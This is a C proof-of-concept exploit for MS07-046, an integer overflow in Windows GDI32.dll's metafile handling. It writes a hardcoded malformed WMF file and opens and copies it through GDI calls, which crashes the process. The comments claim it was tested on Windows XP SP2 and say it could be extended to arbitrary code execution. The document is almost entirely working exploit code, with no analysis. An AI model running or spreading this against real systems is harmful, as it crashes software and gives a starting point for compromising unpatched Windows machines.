/*
 * MS07-046(GDI32.dll Integer overflow DOS) Proof Of Concept Code
 
 * by Hong Gil-Dong & Chun Woo-Chi

 * Yang yeon(?~1542), Korea
 * "I shall keep clenching my left fist unitl i see the real tao".

 * This POC is only for test. If an application read a malformed wmf 
 * file like this POC, the application will be crashed. If you apply 
 * this code, you can execute an arbitrary code.
 *

 * We tested this code on Windows XP SP2 Korean Edition 
 * (GDI32.dll version 5.1.2600.3099). But it will work well on other
 * systems.
 */

#include <stdio.h>
#include <windows.h>

#define WMF_FILE "ms07-046.wmf"

void usage(void);

int main()
{
	
	FILE *fp;

	char wmf[] = "\x01\x00\x09\x00\x00\x03\x11\x00\x00\x00\x00\x00"\
                 "\x05\x00\x00\x00\x00\x00\xFF\xFF\xFF\xFF\x13\x02"\
                 "\x32\x00\x96\x00\x03\x00\x00\x00\x00\x00";
	int i;
	
	HMETAFILE srcMeta;

    usage();

	if ((fp = fopen(WMF_FILE, "w")) == NULL) {
                printf("File %s write error\n", WMF_FILE);
                return 0;
	}

	for(i=0; i<sizeof(wmf)-1; i++)
		fputc(wmf[i], fp);

	fclose(fp);

    srcMeta = GetMetaFile(WMF_FILE);
    CopyMetaFile( srcMeta, NULL);

    return 0;
}

void usage(void) 
{
   printf("MS07-046 Windows Meta File RecordParms Integer Overflow \n");
   printf("Proof of Concept by Hong Gil-Dong & Chun Woo-Chi \n");
      
}
